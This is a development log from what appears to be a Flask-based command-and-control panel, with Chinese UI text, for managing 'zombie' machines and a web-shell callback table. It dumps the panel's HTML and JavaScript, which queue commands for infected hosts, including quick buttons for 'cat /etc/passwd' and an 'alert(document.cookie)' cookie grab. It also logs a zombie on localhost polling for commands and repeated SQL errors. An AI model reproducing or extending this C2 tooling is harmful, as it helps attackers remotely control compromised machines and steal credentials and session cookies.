Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 22:05:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:03] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-25 22:05:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:03] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 22:05:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:03] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 22:05:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 22:05:06 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 22:05:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 22:05:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:06] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 22:05:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-25 22:05:10 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-25 22:05:10 | INFO     | control_route.py:225 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: alert(document.cookie)
2025-06-25 22:05:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 22:05:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:10] "[32mPOST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1[0m" 302 -
2025-06-25 22:05:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 22:05:10 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 22:05:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-success alert-dismissible fade show" role="alert">\n                成功為 127.0.0.1 添加命令！\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message success">\n            成功為 127.0.0.1 添加命令！\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 22:05:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:10] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 22:05:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:05:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:05:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-25 22:05:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 22:05:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:05:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:05:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-25 22:05:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 22:05:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:05:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:05:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-25 22:05:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:05:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:18:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:18:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:18:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:18:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:18:58 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:18:58 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:18:58 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:18:58 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:18:58 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:20:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:20:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 21:20:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:20:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 21:20:32 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:20:32 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 21:20:32 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:20:32 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 21:20:32 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 21:21:02 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 21:21:02 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 21:21:03 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 8479)
2025-06-26 21:21:03 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 21:21:03 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:21:03 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 21:21:03 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 21:21:03 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 21:21:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:05 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0209s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:05] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:26 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:26] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:31 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:31] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:36 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:36] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:41 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:41] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:21:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:21:46 | ERROR    | control_route.py:162 | get_command() | 獲取命令時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.target_report
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command, web_shell_back_point.target_report AS web_shell_back_point_target_report 
FROM web_shell_back_point 
WHERE web_shell_back_point.target_ip = ?
 LIMIT ? OFFSET ?]
[parameters: ('127.0.0.1', 1, 0)]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-26 21:21:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 21:21:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:21:46] "[35m[1mGET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 21:21:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
